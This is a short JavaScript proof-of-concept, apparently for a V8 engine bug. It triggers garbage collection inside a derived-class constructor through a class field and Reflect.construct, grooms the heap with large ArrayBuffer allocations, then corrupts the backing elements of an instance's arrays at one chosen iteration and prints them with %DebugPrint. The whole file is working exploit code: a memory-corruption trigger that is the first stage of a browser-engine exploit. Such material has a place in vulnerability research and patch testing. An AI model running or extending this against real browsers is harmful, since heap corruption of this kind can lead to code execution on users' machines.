
var gcSize = 0x4fe00000;
function gc() {
    new ArrayBuffer(gcSize);
}

let empty_object = {}
let corrupted_instance = null;

class ClassParent { }
class ClassBug extends ClassParent {
    constructor (a20, a21, a22) {
        const v24 = new new.target();

        // We will overwrite the contents of the backing elements of this array.
        let x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];

        super();

        let a = [1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];

        this.x = x;
        this.a = a;

    }

    [1] = gc();
}

for (let i = 0; i < 200; i++) {
    gc_flag = false;
    if (i % 2 == 0)
        gc_flag = true;
    gc();
}

for (let i = 0; i < 650; i++) {
    gc_flag = false;

    // We will do a gc a couple of times before we hit the bug to clean up the
    // heap. This will mean that when we hit the bug, the nursery space will have
    // very few objects and it will be more likely to have a predictable layout.
    if (i == 644 || i == 645 || i == 646 || i == 640) {
        gc_flag = true;
        gc();
        gc_flag = false;
    }

    // We are going to trigger the bug. To do so we set `gc_flag` to true
    // before we construct ClassBug.
    if (i == 646) gc_flag = true;

    let x = Reflect.construct(ClassBug, [], ClassParent);

    // We save the ClassBug instance we corrupted by the bug into `corrupted_instance`
    if (i == 646) corrupted_instance = x;
}

% DebugPrint(corrupted_instance.x);
% DebugPrint(corrupted_instance.a);